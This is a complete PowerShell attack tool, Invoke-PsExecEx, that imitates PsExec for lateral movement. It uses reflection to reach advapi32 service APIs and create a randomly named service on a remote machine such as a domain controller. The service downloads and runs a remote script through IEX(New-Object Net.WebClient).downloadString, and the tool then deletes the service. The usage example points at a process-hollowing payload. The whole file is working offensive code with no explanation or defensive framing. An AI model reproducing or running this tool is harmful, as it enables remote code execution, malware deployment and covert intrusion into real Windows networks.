function Invoke-PsExecEx
{
    Param(
        [Parameter()]
        [string]$MachineName,
 
        [Parameter()]
        [string]$ServiceName,

        [Parameter()]
        [string]$URL
    ) 

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
                
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
                
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
            
        Write-Output $TypeBuilder.CreateType()
    }
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
            
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
                
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )
            
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    if(($MachineName -eq "" ) -Or ($URL -eq ""))
    {
        Write-Output "Usage: "
        Write-Output "Invoke-PsExecEx -MachineName dc01 -ServiceName testsv -Url http://192.168.0.1/process_hollowing.ps1"
    }
    if($ServiceName -eq "")
    {
        $ServiceName =  -join ((1..10) | %{(65..90) + (97..122) | Get-Random} | % {[char]$_})
    }
    
    $Payload = "C:\Windows\System32\cmd.exe /c powershell -c IEX(New-Object Net.WebClient).downloadString('$URL')"

    $OpenSCManagerAddr = Get-ProcAddress advapi32.dll OpenSCManagerA
    $OpenSCManagerDelegate = Get-DelegateType @([String], [String], [Int]) ([IntPtr])
    $SCMHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAddr, $OpenSCManagerDelegate).Invoke($MachineName,'ServicesActive' , 0xF003F)  # 0xF003F = SC_MANAGER_ALL_ACCESS
    
    $CreateServiceAddr = Get-ProcAddress Advapi32.dll CreateServiceA
    $CreateServiceDelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
    $CreateService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAddr, $CreateServiceDelegate).Invoke($SCMHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Payload, $null, $null, $null, $null, $null)

    $OpenServiceAddr = Get-ProcAddress advapi32.dll OpenServiceA
    $OpenServiceDelegate = Get-DelegateType @([IntPtr], [String], [UInt32]) ([IntPtr])
    $SHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAddr, $OpenServiceDelegate).Invoke($SCMHandle, $ServiceName, 0xF01FF)

    $StartServiceAddr = Get-ProcAddress advapi32.dll StartServiceA
    $StartServiceDelegate = Get-DelegateType @([IntPtr], [Int], [String]) ([IntPtr])
    $Result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAddr, $StartServiceDelegate).Invoke($SHandle, 0, $null)

    $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
    $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
    $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate).Invoke($SHandle)
}
